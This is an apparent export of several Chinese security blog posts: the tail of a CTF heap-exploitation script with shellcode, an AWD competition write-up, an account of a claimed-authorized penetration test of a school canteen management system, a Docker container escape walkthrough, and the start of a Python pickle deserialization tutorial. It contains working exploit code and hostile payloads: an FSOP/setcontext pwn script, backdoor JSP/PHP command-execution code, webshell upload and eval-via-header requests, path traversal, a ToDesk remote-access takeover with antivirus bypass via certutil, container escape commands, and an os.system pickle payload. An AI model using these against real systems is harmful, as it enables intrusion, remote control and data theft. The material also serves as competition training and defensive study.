#1\nadd(0x300) #2\nadd(0x438) #3\nadd(0x300) #4\nfree(1)\nadd(0x500)\nedit(0,b'a'*0x308+b'rotwilll')\nshow(0)\n\np.readuntil('rotwilll')\nlarge=u64(p.readuntil('Welcome',drop=1).ljust(8,b'\\x00'))\nprint(hex(large))\npause()\nlibc.address=large-0x21b0e0\nstdout=libc.sym['_IO_2_1_stdout_']\nwfile_jump=libc.sym['_IO_wfile_jumps']\niolist=libc.sym['_IO_list_all']\nsuccess(f\"libcaddr=0x{libc.address:x}\")\n\nedit(0,b'a'*0x308+p64(0x451)+p64(large)*2+p64(iolist-0x20)*2)\nfree(3)\nadd(0x500)\nedit(0,b'a'*0x308+b'rotwilll')\nshow(0)\np.readuntil('rotwilll')\nchunk=u64(p.readuntil('Welcome',drop=1).ljust(8,b'\\x00'))\nprint(hex(chunk))\n\nfake_io_add=chunk\nchunk1=chunk-0x300\ngs=chunk1\nshelladd=chunk1+0x200\n\nshellcode=shellcraft.open(\"flag\")+shellcraft.read(3,chunk,0x300)+shellcraft.write(1,chunk,0x300)\nmprotect=libc.sym['mprotect']\nsetcontext=libc.sym['setcontext']\ngadget=libc.address+0x167420\n\nfake_io=flat({\n    0x28: [gs,1],\n    0x98: fake_io_add+0x28,\n    0xa0: fake_io_add,\n    0xd8: wfile_jump+0x30,\n    },filler=b'\\x00')\ngsdata=flat({\n    8: [gs,shelladd],\n    0x20: setcontext+0x3d,\n    0x28: gadget,\n    0x68: gs&(~0xfff), # rdi\n    0x70: 0x1000, # rsi\n    0x88: 7, # rdx\n    0xa0: gs+0x10, #rsp\n    0xa8: mprotect, #rcx->rip\n    0xe0: gs\n    },filler=b'\\x00')\n#payload=fake_io#+asm(shellcode)\n\npayload=gsdata\npayload=payload.ljust(0x200,b'\\x00')\npayload+=asm(shellcode)\npayload=payload.ljust(0x300)\n#add(0x438,payload[0x10:])\npayload=payload+fake_io\n\nedit(2,payload)\n\n#exit()\np.interactive()\n```\n\n\n\n# crypto\n\n## 古典密码\n\n![](/img/wp/2024/2024ciscn-古典密码-1.png)","tags":["wp","ciscn","2024竞赛"],"categories":["wp"]},{"title":"第一届长城杯信息安全铁人三项赛半决赛（第三赛区）AWD WP","url":"/posts/359b7a99/","content":"\nrank: 6\n\n# tomcat\n\n## 漏洞1-文件上传getshell\n\n`data.sql`泄露教师账号密码\n\n```sql\nINSERT INTO `teacher` VALUES ('admin','admin1','','','admin@qq.com');\n```\n\n登录后台`login.jsp`\n\n后台用户上传头像处存在任意文件上传\n\n![](/img/awd/ccb-tomcat-1.png)\n\n\n**攻击：**\n\n\n![](/img/awd/ccb-tomcat-2.png)\n\n\n**修复：**\n\n修改后台密码/修改上传代码/增加waf\n\n\n## 漏洞2-默认后门\n\n`\\webapps\\ROOT\\forget.jsp`存在后门\n\n```java\n<%\n    String cmdParameter = request.getParameter(\"cmd1\");\n    if (cmdParameter != null && !cmdParameter.isEmpty()) {\n        try {\n            // 构建系统命令\n            ProcessBuilder processBuilder = new ProcessBuilder();\n            processBuilder.command(\"sh\", \"-c\", cmdParameter);\n\n            // 执行命令并获取输出\n            Process process = processBuilder.start();\n            InputStream inputStream = process.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n            String line;\n            StringBuilder output = new StringBuilder();\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n\n            // 输出命令执行结果\n            out.println(\"Command executed successfully. Output:\\n\" + output.toString());\n        } catch (IOException e) {\n            out.println(\"Error executing command: \" + e.getMessage());\n        }\n    }\n%>\n```\n\n\n**攻击：**\n\n开局很快都修复了，手动交了两三个\n\n\n**修复：**\n\n把密码改了\n\n\n\n# cms\n\n\n## 漏洞1-任意文件读取\n\n`\\app\\frontend\\controller\\Ajax.php` 存在任意文件读取\n\n```php\n    public function getfile($file)\n    {\n        $file = root_path().'public/storage/uploads/'.$file;\n        // 检查文件是否存在\n        if (!file_exists($file)) {\n            $result = ['code' => 0, 'msg' => lang('file not exists!')];\n            return json($result);\n        }\n\n        // 获取文件名\n        $fileName = basename($file);\n\n        // 设置HTTP响应头\n        header('Content-Type: application/octet-stream');\n        header('Content-Disposition: attachment; filename=' . $fileName);\n        header('Content-Length: ' . filesize($file));\n\n        // 读取文件并输出给用户\n        readfile($file);\n\n        // 终止脚本继续执行\n        exit;\n    }\n```\n\n\n\n**攻击：**\n\n```php\n/frontend/Ajax/getfile?file=../../../../../../flag\n```\n\n![](/img/awd/ccb-cms-1.png)\n\n\n**修复：**\n\n增加过滤\n\n\n```php\npublic function getfile($file)\n    {\n        $file = root_path().'public/storage/uploads/'.$file;\n        // 检查文件是否存在\n\n        $file = str_replace(\"../\",\"\",$file);\n        $file = str_replace(\"flag\",\"\",$file);\n\n        if (!file_exists($file)) {\n            $result = ['code' => 0, 'msg' => lang('file not exists!')];\n            return json($result);\n        }\n\n        // 获取文件名\n        $fileName = basename($file);\n\n        // 设置HTTP响应头\n        header('Content-Type: application/octet-stream');\n        header('Content-Disposition: attachment; filename=' . $fileName);\n        header('Content-Length: ' . filesize($file));\n\n        // 读取文件并输出给用户\n        readfile($file);\n\n        // 终止脚本继续执行\n        exit;\n    }\n```\n\n## 漏洞2-默认后门\n\n`\\app\\api\\controller\\v1\\Token.php`存在任意命令执行\n\n```php\n<?php\nnamespace app\\api\\controller\\v1;\n\nuse fun\\auth\\Api;\nuse think\\App;\nuse think\\facade\\Request;\nuse think\\facade\\Config;\n\n/**\n * 生成token\n */\nclass Token extends Api\n{\n    protected $noAuth = ['*'];\n\n    public function __construct(App $app)\n    {\n        parent::__construct($app);\n        //跨域\n        header('Access-Control-Allow-Origin:*');\n        header('Access-Control-Allow-Headers:Accept,Referer,Host,Keep-Alive,User-Agent,X-Requested-With,Cache-Control,Content-Type,Cookie,token');\n        header('Access-Control-Allow-Credentials:true');\n        header('Access-Control-Allow-Methods:GET, POST, PATCH, PUT, DELETE,OPTIONS');\n\n    }\n\n    public function build(Request $request)\n    {\n        $class = ucwords('\\\\fun\\\\auth\\\\'.ucfirst($this->type).'Token');\n        $token = $class::instance();\n        $token->build();\n\n    }\n    public function refresh(Request $request)\n    {\n        $class = ucwords('\\\\fun\\\\auth\\\\'.ucfirst($this->type).'Token');\n        $token = $class::instance();\n        $token->refresh();\n\n    }\n       public function test(){\n    @eval(getallheaders()['Referer']);\n    }\n}\n```\n\n**攻击：**\n\n```\nGET /api/v1.token/test HTTP/1.1\nHost: 8.147.134.118:24631\nReferer:system(\"cat /flag\");\n\n\n```\n\n\n**修复：**\n\n添加注释\n\n```php\npublic function test(){\n    //@eval(getallheaders()['Referer']);\n}\n```\n\n## 漏洞3-文件上传getshell\n\n~~貌似还有个任意文件上传，比赛的时候没时间看了~~\n\n\n**赛后复现**\n\n\n注册后的基本设置有上传头像的地方\n\n![](/img/awd/ccb-cms-2.png)\n\n\n定位代码\n\n/app/common/service/UploadService.php\n\n```php\n/**\n * @param $file\n * @return bool\n * @throws Exception\n * 检测文件是否符合要求\n */\nprotected function checkFile()\n{\n    //禁止上传PHP和HTML.ssh等脚本文件\n    if (\n//           in_array($this->file->getMime(),\n//               ['application/octet-stream', 'text/html','application/x-javascript','text/x-php','aplication/x-msdownload','application/java-archive'])\n//           ||\n    in_array($this->file->extension(),\n        ['php', 'html', 'htm','xml','ssh','bat','jar','java'])) {\n        throw new Exception(lang('File format is limited'));\n    }\n    //文件大小限制\n    if (($this->file->getSize() > $this->fileMaxsize*1024)) {\n        throw new Exception(lang('File size is limited'));\n    }\n    //文件类型限制\n    if ($this->fileExt !='*' && !in_array($this->file->extension(),explode(',',$this->fileExt))){\n        throw new Exception(lang('File type is limited'));\n    }\n    $file_ext = $this->file->extension();\n    if (in_array($this->file->getMime(), ['image/gif', 'image/jpg', 'image/jpeg', 'image/bmp','image/png', 'image/webp']) || in_array($file_ext, ['gif', 'jpg', 'jpeg', 'bmp', 'png','webp'])) {\n        $imgInfo = getimagesize($this->file->getPathname());\n        if (!$imgInfo || !isset($imgInfo[0]) || !isset($imgInfo[1])) {\n            throw new Exception(lang('Uploaded file is not a valid image'));\n        }\n        $this->width = isset($imgInfo[0]) ? $imgInfo[0] : 0;\n        $this->height = isset($imgInfo[1]) ? $imgInfo[1] : 0;\n    }\n    return true;\n}\n```\n\n限制了部分后缀，用`phtml`绕过\n\n![](/img/awd/ccb-cms-3.png)\n\n```\nPOST未授权上传，不需要登录\n\nPOST /frontend/ajax/uploads HTTP/1.1\nHost: 192.168.100.129\nContent-Length: 206\nAccept: application/json, text/javascript, */*; q=0.01\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbISZWkAvBPdc8u0\nOrigin: http://192.168.100.129\nReferer: http://192.168.100.129/frontend/member/set.html\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n\n------WebKitFormBoundaryDbISZWkAvBPdc8u0\nContent-Disposition: form-data; name=\"file\"; filename=\"1.phtml\"\nContent-Type: image/jpeg\n\n<?php\neval($_POST['a']);\n------WebKitFormBoundaryDbISZWkAvBPdc8u0--\n\n```\n\n\n**修复**\n\n便捷的：增加对phtml的过滤\n\n```php\nin_array($this->file->extension(),\n            ['php', 'html', 'htm','xml','ssh','bat','jar','java','phtml'])) {\n            throw new Exception(lang('File format is limited'));\n        }\n```\n\n或者稍微麻烦一点的，增加一个白名单\n\n/app/frontend/controller/Ajax.php\n\n```php\n/**\n * @return \\think\\response\\Json\n * @throws \\think\\db\\exception\\DataNotFoundException\n * @throws \\think\\db\\exception\\DbException\n * @throws \\think\\db\\exception\\ModelNotFoundException\n * 文件上传总入口 集成qiniu ali tenxunoss\n */\npublic function uploads()\n{\n    try {\n\n        $list = ['jpg','png','gif','jpeg'];\n        $file = $this->request->file('file');\n        $ext = strtolower(pathinfo($file->getOriginalName(), PATHINFO_EXTENSION));\n        if (!in_array($ext,$list)){\n            throw new Exception('NO');\n        }\n\n        $upload = UploadService::instance();\n        $result = $upload->uploads(session('member.id'),0);\n        return json($result);\n    } catch (Exception $e) {\n        $this->error($e->getMessage());\n    }\n}\n```\n\n\n## 漏洞4-后台文件上传+文件包含RCE\n\n**赛后复现**\n\nF12 泄露账号密码\n\n```javascript\n<script>\n    layui.use(['layer', 'jquery'], function () {\n        var $ = layui.jquery,\n            layer = layui.layer;\n        $('.layui-tips').hover(function () {\n            layer.tips('账号admin,密码123456');\n        })\n    })\n</script>\n```\n\n访问`/backend`登录后台\n\n发现有一个离线安装插件的功能\n\n审计代码\n\n/app/backend/controller/Addon.php\n\n```php\n/**\n * @NodeAnnotation(title=\"离线安装\")\n * @throws Exception\n */\npublic function localinstall()\n{\n    if($this->request->isAjax()){\n        set_time_limit(0);\n        $urls = parse_url(input('url'));\n        $file = $urls['path']??'';\n        if($file && file_exists('.'.$file)){\n            try {\n                $res = ZipHelper::unzip('.'.$file,'../addons');\n            }catch (\\Exception $e){\n                $this->error($e->getMessage());\n            }\n            if($res){\n                $index = strpos($res, '/');\n                $addon = $index ? substr($res,0,$index):$res;\n                $this->install($addon,'local');\n            }\n            $this->success('upload success');\n        }\n    }\n}\n```\n\n/vendor/funadmin/fun-addons/src/helper/ZipHelper.php\n\n```php\n/**\n *  解压文件\n * @param $zipFile 相对文件路劲\n * @param $folderPath 相对文件夹路劲\n */\npublic static function unzip( $zipFile,$folderPath,$addon=0)\n{\n    // Initialize archive object\n    if (!class_exists('ZipArchive')) {\n        throw new \\Exception('ZinArchive not find');\n    }\n    $zip = new \\ZipArchive();\n    try {\n        $zip->open($zipFile);\n    } catch (\\Exception $e) {\n        $zip->close();\n        throw new \\Exception('Unable to open the zip file');\n    }\n    if (!is_dir($folderPath)) {\n        @mkdir($folderPath, 0755);\n    }\n    $fileDir = trim($zip->getNameIndex(0), '/');\n    //解压压缩包\n    try {\n        $zip->extractTo($folderPath);\n    } catch (\\Exception $e) {\n        throw new \\Exception('Unable to extract the file');\n    } finally {\n        $zip->close();\n    }\n    return $fileDir;\n}\n```\n\n可以发现虽然报错了，但是依然会解压到addons目录下\n\n![](/img/awd/ccb-cms-5.png)\n\n\n\n但是无法访问到，这里需要用到文件上传+文件包含组合拳进行利用\n\n/app/backend/controller/Ajax.php\n\n```php\n/**\n * @return \\think\\response\\Jsonp\n * 自动加载语言函数\n */\npublic function lang()\n{\n    header('Content-Type: application/javascript');\n    $name = $this->request->get(\"controllername\");\n    $name = strtolower(parse_name($name, 1));\n    $app = $this->request->get(\"app\");\n    return jsonp($this->loadlang($name, $app))->code(200)->options([\n        'var_jsonp_handler' => 'callback',\n        'default_jsonp_handler' => 'jsonpReturn',\n        'json_encode_param' => JSON_PRETTY_PRINT | JSON_FORCE_OBJECT |JSON_UNESCAPED_UNICODE,\n    ])->allowCache(true)->expires(7200);\n}\n```\n\n跟进loadlang方法\n\n/app/common/controller/Backend.php\n\n```php\nprotected function loadlang($name,$app)\n{\n    $lang = cookie(config('lang.cookie_var'));\n    if($app && $app!=='backend'){\n        $res =  Lang::load([\n            $this->app->getBasePath() .'backend'. DS . 'lang' . DS . $lang . '.php',\n            $this->app->getBasePath() .$app. DS . 'lang' . DS . $lang  . '.php',\n            $this->app->getBasePath() .$app. DS . 'lang' . DS . $lang . DS . str_replac('.', DS, $name) . '.php',\n        ]);\n   }else{\n        $res = Lang::load([\n            $this->app->getAppPath() . 'lang' . DS . $lang . '.php',\n            $this->app->getAppPath() . 'lang' . DS . $lang . DS . str_replace('.', DS,$name) . '.php',\n        ]);\n    }\n    return $res;\n}\n```\n\n很明显，从 lang.cookie_var 配置中获取一个cookie值并进行文件包含\n\n查看cookie_var的名字\n\n/config/lang.php\n\n```php\nreturn [\n    // 默认语言\n    'default_lang'    => Env::get('lang.default_lang', 'zh-cn'),\n    // 允许的语言列表\n    'allow_lang_list' => ['zh-cn','en-us'],\n    // 多语言自动侦测变量名 / 自动侦测的GET变量名\n    'detect_var'      => 'lang',\n    // 是否使用Cookie记录\n    'use_cookie'      => true,\n    // 多语言cookie变量\n    'cookie_var'      => 'think_lang',\n    // 扩展语言包\n    'extend_list'     => [],\n    // Accept-Language转义为对应语言包名称\n    'accept_language' => [\n        'zh-hans-cn' => 'zh-cn',\n    ],\n    // 是否支持语言分组\n    'allow_group'     => true,\n];\n```\n\n因为是全局变量，所以任何地方都可以调用\n\n包含的时候注意后缀 .php 已经存在了，不需要再写\n\n![](/img/awd/ccb-cms-4.png)\n\n\n\n```text\nPOST / HTTP/1.1\nHost: 0dbaba9b-169b-4afb-ab9d-71f60e228260.ctfd.lewiserii.top:8080\nCookie: think_lang=/../../../addons/shell;\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 19\n\na=system('whoami');\n```\n\n**修复**\n\n对 $lang 进行过滤即可\n\n\n# DocToolkit\n\n## 漏洞1-默认后门\n\n\n存在默认后门\n\n```java\npackage com.example.doctoolkit.controller.test;\n\nimport java.io.IOException;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RequestMapping({\"/test\"})\n@RestController\n/* loaded from: DocToolkit-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/doctoolkit/controller/test/TestController.class */\npublic class TestController {\n    @RequestMapping({\"/backd0or\"})\n    public String backdoor(@RequestParam(\"cmd\") String command) throws IOException {\n        if (command != null) {\n            boolean isLinux = true;\n            String osType = System.getProperty(\"os.name\");\n            if (osType != null && osType.toLowerCase().contains(\"windows\")) {\n                isLinux = false;\n            }\n            byte[] bytes = new byte[1024];\n            String[] cmds = isLinux ? new String[]{\"bash\", \"-c\", command} : new String[]{\"cmd.exe\", \"/c\", command};\n            Process process = new ProcessBuilder(cmds).start();\n            int len = process.getInputStream().read(bytes);\n            String output = new String(bytes, 0, len);\n            return output;\n        }\n        return null;\n    }\n}\n```\n\n**攻击：**\n\n`/test/backd0or?cmd=cat /flag`\n\n![](/img/awd/ccb-DocToolkit-1.png)\n\n\n\n**修复：**\n\n没修复成功。。\n\n\n## 漏洞2-shiro反序列化\n\n有shiro依赖\n\n在shiro的配置文件中发现了固定秘钥\n\n\n![](/img/awd/ccb-DocToolkit-2.png)\n\n\n直接用工具打就好了，然后抓流量进行批量\n\n\n![](/img/awd/ccb-DocToolkit-3.png)\n","tags":["awd","wp","长城杯"],"categories":["wp"]},{"title":"xx市学校食堂原辅材料统一配送管理系统","url":"/posts/62ba3513/","content":"\n>2023.8月合法授权进行渗透测试，现已修复\n\n\n# 外网\n\n后台发现后直接就是一个弱口令\n\nadmin/7654321\n\n![](/img/内网/intranet1-1.png)\n\n\n测试后发现公告处存在任意文件上传\n\n![](/img/内网/intranet1-2.png)\n\n上传一个jsp\n\n![](/img/内网/intranet1-3.png)\n\n\n冰蝎连接后直接拿下\n\n![](/img/内网/intranet1-4.png)\n\n\n# 内网\n\n接着进行当前主机的信息收集\n\n软件：火绒，todesk，360浏览器等\nOS：Microsoft Windows Server 2016 Standard\n网段：10.77.0.0/24\n\n![](/img/内网/intranet1-5.png)\n\n\n## 远程连接\n\n>看到目标安装了todesk后就突发奇想，想着能不能连接上看看\n\n这里用的方法是上传todesk+nircmd实现远程连接\n\nTodesk精简版：https://dl.todesk.com/windows/ToDesk_Lite.exe\nNircmd: http://www.nirsoft.net/utils/nircmd.html\n\n------------------------\n\n正常情况应该是运行ToDesk_Lite.exe后截图可以直接看到密码，如下图\n\n![](/img/内网/intranet1-7.png)\n\n------------------------\n\n但是当时的情况是上传完后截图发现有一个弹窗\n\n截图命令 `nircmd.exe savescreenshot D:\\2.png`\n\n![](/img/内网/intranet1-6.png)\n\n比todesk的优先级高，这样会看不到窗口程序，所以需要先杀掉弹窗\n\ntasklist查看，得到进程名称`MusNotificationUx.exe`\n杀进程：`taskkill /IM \"MusNotificationUx.exe\"`\n\n\n如果还有其他窗口，可以使用vbs命令清空\n\n```vbs\nDim objSHA\nSet objSHA = CreateObject(\"Shell.Application\")\nobjSHA.ToggleDesktop\nSet objSHA = Nothing\n\n且火绒不允许创建vbs文件，可以用系统自带的certutil实现bypass\ncertutil -encode 1.vbs 1.txt\ncertutil -decode 1.txt 1.vbs\n```\n\n------------------------\n\n清空后再次运行并截图\n\n![](/img/内网/intranet1-8.png)\n\n因为运行的是系统本身安装的todesk，而不是精简版，所以还需要获取连接密码\n\n可以找到config.ini文件中的hash，复制到本地，在本地启动todesk拿到密码\n\n![](/img/内网/intranet1-9.png)\n\n![](/img/内网/intranet1-10.png)\n\n至此实现todesk连接\n\n\n![](/img/内网/intranet1-12.png)\n\n\n## 横向移动\n\n就不详细放图了，都是同一网段的\n\n```text\nAVA互动管理软件x1\nHDMx1\nGrandstream GXP1610 企业ip电话管理x4\n海康威视摄像头x2\nVBC网络核心智能管理系统x1\nh3c设备x1\n主机getshellx3\n```\n","tags":["内网渗透"],"categories":["内网渗透"]},{"title":"Be-a-Docker-Escaper-4 & Be-a-Cloud-Hacker","url":"/posts/90615d01/","content":"\n>题目来自2024年第六届RWCTF体验赛\n\n一道关于容器逃逸的题目\n\n\n## Be-a-Docker-Escaper-4\n\nssh连上后可以通过`ps -aux`命令看到这个容器的启动命令\n\n```docker\ndocker run --rm -it --pid=host --security-opt=apparmor=unconfined ubuntu bash\n```\n\n![](/img/docker/docker-e-1.png)\n\n\n这里介绍下`--pid=host`这个参数，指定为host后会使用宿主机的pid namespace。可以通过ps命令看到容器外的进程\n\n```docker\n--pid=\"\"  : Set the PID (Process) Namespace mode for the container,\n             'container:<name|id>': joins another container's PID namespace\n             'host': use the host's PID namespace inside the container\n```\n\n\n因为容器共享了`pid`，并且关闭了apparmor，所以可以利用某些进程的`/proc/[pid]/root`符号链接实现容器逃逸\n\n\n\n先找到宿主机上以非 root 用户运行的进程\n很明显有个sleep进程\n\n![](/img/docker/docker-e-2.png)\n\n\n然后在容器中创建一个 UID 和 GID 与目标进程 UID 和 GID 相同的用户\n这里的uid很明显是1000，gid则需要猜测（基本从1000开始，这一题中是1001）\n\n![](/img/docker/docker-e-3.png)\n\n\n最后用 su 命令切换到该用户，就有权限访问目标进程的 /proc/[pid]/root 了\n\n![](/img/docker/docker-e-4.png)\n\n\n非预期解法\n```bash\nfor fd in `find /proc/*/root`; do ls -al $fd | grep \\>; done\n```\n\n\n\n## Be-a-Cloud-Hacker\n\n先提升权限\n\n创建特权容器\n\n```text\napt update\napt install docker.io\n# cat /proc/$pid/root/etc/group得到gid为1000，将原来的替换成1000\nsed -i 's/docker:x:103:/docker:x:1000:/g' /etc/group\nusermod -aG docker exp\n\nsu exp\npid=$(pidof sleep)\ndocker -H unix:///proc/$pid/root/run/docker.sock run -it --privileged ubuntu bash\n```\n\n在特权容器中逃逸\n\n```text\nmkdir /tmp/m\nmount /dev/sda1 /tmp/m\n```\n\n最后找cloud-init的配置文件中的密码就行了（默认在/var/lib/cloud）\n\n![](/img/docker/docker-e-5.png)\n\n\n\n\n-------------------\n\n参考文章：[一个未公开的容器逃逸方式](https://www.anquanke.com/post/id/290540)","tags":["docker","逃逸"],"categories":["docker"]},{"title":"python反序列化","url":"/posts/ab2b72a2/","content":"\n# python的序列化和反序列化\n\n与PHP，Java类似，python的序列化和反序列化就是对象与数据的相互转换，是为了解决对象传输与持久化存储问题\n\n在Python中序列化一般通过pickle模块和json模块实现\n\npickle模块和json模块提供了dumps()、dump()、loads()、load()四个函数\n\n| 函数 | 说明 |\n|---------|---------|\n| dump() | 对象反序列化到文件对象并存入文件 |\n| dumps() | 对象反序列化为 bytes 对象 |\n| load() | 对象反序列化并从文件中读取数据 |\n| loads() | 从 bytes 对象反序列化 |\n\n\n与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型\n\n\n\n# PVM\n\n>python序列化和反序列化的过程都是发生在PVM(Pickle Virtual Machine)上的，它是Python标准库中的一部分，由Python的pickle模块提供支持\n\n\npvm由指令处理器、栈区和内存区三部分组成\n\n* 指令处理器：也就是引擎，从流中读取opcode和参数, 并对其进行解释处理. 重复这个动作, 直到遇到.这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回\n\n* 栈区：由Python的list实现, 被用来临时存储数据、参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化的结果\n\n* 内存区：或者称为标签区，由Python的dict实现, 为PVM的整个生命周期提供存储（将反序列化完成的数据以 key-value 的形式储存在memo中，以便后来使用）\n\n\n## PVM 协议\n\n因为python版本的不同，所以默认使用的协议不同。因为PVM的指令集用的协议有很大的差别，所以不同的python版本序列化出来的数据是有差别的\n\n可以通过`protocol=num`来选择opcode的版本，pickle协议是向前兼容的\n\n```python\nimport pickle\n\n\nclass Test:\n    def __init__(self, name='lewiserii'):\n        self.name = name\n\n\ntest = Test()\nfor i in range(6):\n    print('[+] pickle v{}: {}'.format(str(i), pickle.dumps(test, protocol=i)))\n```\n\n```python\n[+] pickle v0: b'ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nTest\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVname\\np6\\nVlewiserii\\np7\\nsb.'\n[+] pickle v1: b'ccopy_reg\\n_reconstructor\\nq\\x00(c__main__\\nTest\\nq\\x01c__builtin__\\nobject\\nq\\x02Ntq\\x03Rq\\x04}q\\x05X\\x04\\x00\\x00\\x00nameq\\x06X\\t\\x00\\x00\\x00lewiseriiq\\x07sb.'\n[+] pickle v2: b'\\x80\\x02c__main__\\nTest\\nq\\x00)\\x81q\\x01}q\\x02X\\x04\\x00\\x00\\x00nameq\\x03X\\t\\x00\\x00\\x00lewiseriiq\\x04sb.'\n[+] pickle v3: b'\\x80\\x03c__main__\\nTest\\nq\\x00)\\x81q\\x01}q\\x02X\\x04\\x00\\x00\\x00nameq\\x03X\\t\\x00\\x00\\x00lewiseriiq\\x04sb.'\n[+] pickle v4: b'\\x80\\x04\\x95/\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x04Test\\x94\\x93\\x94)\\x81\\x94}\\x94\\x8c\\x04name\\x94\\x8c\\tlewiserii\\x94sb.'\n[+] pickle v5: b'\\x80\\x05\\x95/\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x04Test\\x94\\x93\\x94)\\x81\\x94}\\x94\\x8c\\x04name\\x94\\x8c\\tlewiserii\\x94sb.'\n```\n\n不同版本间的区别\n\n```text\nv0 版协议是原始的\"人类可读\"协议，并且向后兼容早期版本的 Python\nv1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容\nv2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）\nv3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议\nv4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议\nv5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）\n```\n\n## opcode\n\nopcode也就是操作码，是序列化内容的核心，并且 opcode 是单字节的\n\n在`$PYTHON/Lib/pickle.py`中可以查看到完整的opcode\n\n以下是V0协议中一些常见的\n\n```python\nMARK           = b'('   # 向栈中压入一个 MARK 标记\nSTOP           = b'.'   # 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值\nPOP            = b'0'   # 丢弃栈顶对象\nPOP_MARK       = b'1'   # 丢弃栈顶到最顶层的标记对象\nDUP            = b'2'   # 重复的顶部堆栈项目\nFLOAT          = b'F'   # 实例化一个 float 对象\nINT            = b'I'   # 实例化一个 int 或者 bool 对象\nNONE           = b'N'   # 栈中压入 None\nREDUCE         = b'R'   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈\nSTRING         = b'S'   # 实例化一个字符串对象\nUNICODE        = b'V'   # 实例化一个 UNICODE 字符串对象\nAPPEND         = b'a'   # 将栈的第一个元素 append 到第二个元素（必须为列表）中\nBUILD          = b'b'   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()\nGLOBAL         = b'c'   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈\nDICT           = b'd'   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果\nEMPTY_DICT     = b'}'   # 向栈中直接压入一个空字典\nAPPENDS        = b'e'   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中\nGET            = b'g'   # 将 memo[n] 的压入栈\nINST           = b'i'   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）\nLIST           = b'l'   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表\nEMPTY_LIST     = b']'   # 向栈中直接压入一个空列表\nOBJ            = b'o'   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，\nPUT            = b'p'   # 将栈顶对象储存至 memo[n]\nSETITEM        = b's'   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中\nTUPLE          = b't'   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果\nEMPTY_TUPLE    = b')'   # 向栈中直接压入一个空元组\nSETITEMS       = b'u'   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中\n```\n\n\n## 处理序列化字节流的过程 <a id=\"a\">\n\n这里用一段简短的字节码来演示利用过程:\n\n```python\ncos\nsystem\n(S'whoami'\ntR.\n```\n\n按照pickle.py中的源码分析处理序列化字节流的过程\n\n**c**\n\n获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈\n\n源代码：\n\n```python\ndef load_global(self):\n    # 读取一行数据，去掉换行符，作为模块名，例子中是os\n    module = self.readline()[:-1].decode(\"utf-8\")\n    # 读取下一行数据，作为类名，例子中是system\n    name = self.readline()[:-1].decode(\"utf-8\")\n    # 调用find_class\n    klass = self.find_class(module, name)\n    # 获取模块后添加到当前栈中\n    self.append(klass)\ndispatch[GLOBAL[0]] = load_global\n\ndef find_class(self, module, name):\n    # Subclasses may override this.\n    # 在系统审计功能记录pickle.find_class事件，附带参数module和name\n    sys.audit('pickle.find_class', module, name)\n\n    # 如果协议版本小于3且开启了fix_imports标志，则进行特殊的名称和模块映射处理\n    if self.proto < 3 and self.fix_imports:\n        # 如果(module, name)在NAME_MAPPING中，则使用映射的名称代替原名称\n        if (module, name) in _compat_pickle.NAME_MAPPING:\n            module, name = _compat_pickle.NAME_MAPPING[(module, name)]\n        # 如果module在IMPORT_MAPPING中，则使用映射的模块名代替原模块名\n        elif module in _compat_pickle.IMPORT_MAPPING:\n            module = _compat_pickle.IMPORT_MAPPING[module]\n\n    # 动态加载指定模块\n    __import__(module, level=0)\n    # 